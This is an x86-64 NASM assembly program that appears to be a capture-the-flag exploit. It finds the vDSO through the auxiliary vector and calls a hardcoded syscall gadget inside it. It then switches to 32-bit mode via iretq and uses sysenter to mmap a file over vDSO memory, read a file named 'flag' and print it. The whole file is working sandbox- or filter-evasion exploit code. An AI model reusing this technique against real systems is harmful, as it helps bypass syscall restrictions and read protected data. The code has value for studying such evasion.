[bits 64]

global start
section .text exec
start: 
	; jmp start

; find vdso
loop1:  pop rax
        cmp rax,0x21
        jne loop1
        pop rsi
	; hardcode syscall/ret offset in vdso
	lea rbx,[rsi+0xc7b]	; store vdso syscall address in rbx

; copy hash name to address 0x31337
	mov edi,0x31337
	mov rsi,[rsp+0x118]
	cld
cpy1:	lodsb
	stosb
	test al,al
	jne cpy1

; open hash file --> fd = 3
	mov edi,0x31337
	xor rsi,rsi
	mov eax,2
	call rbx

; copy 'flag' to address 0x31337
        mov edi,0x31337
        lea rsi,[fname1]
	lodsq
	mov [rdi],rax

; open flag --> fd = 4
        xor rsi,rsi
        mov eax,2
        call rbx

	; keep low part of vdso
	sub ebx,0x1000
	and ebx,~0xfff

; switch to 32bit
        lea     rsp, [sspace]
        lea     rcx,[next2]
	mov	eax,ss
	push	rax		; ss
	push	rsp		; rsp
	push    0x0202		; eflags
        push    0x23		; cs
        push    rcx		; rip
        iretq

fname1:	db "flag",0

[bits 32]
next2:
; try to map hashfile to vdso low memory
        mov eax, 0x5a
        push 0 ; offset
        push 3 ; fd
        push 0x11 ; flags
        push 5 ; prot
        push 0x3000 ; len
        push ebx
        mov ebx, esp
        call do_sysenter
; read
        mov eax, 3
        mov ebx, 4
        mov ecx, 0x31337
        mov edx, 128
        call do_sysenter
; write
	mov edx,eax
        mov eax, 4
        mov ebx, 1
        mov ecx, 0x31337
        call do_sysenter
; exit (and return 137)
        mov eax, 1
        mov ebx, 137
        call do_sysenter

do_sysenter:
        mov ebp, esp
        sysenter
; nopsled (god knows where sysenter will return)
        times 4096 db 0xc3

	section .bss noexec
        resq 4096
sspace:

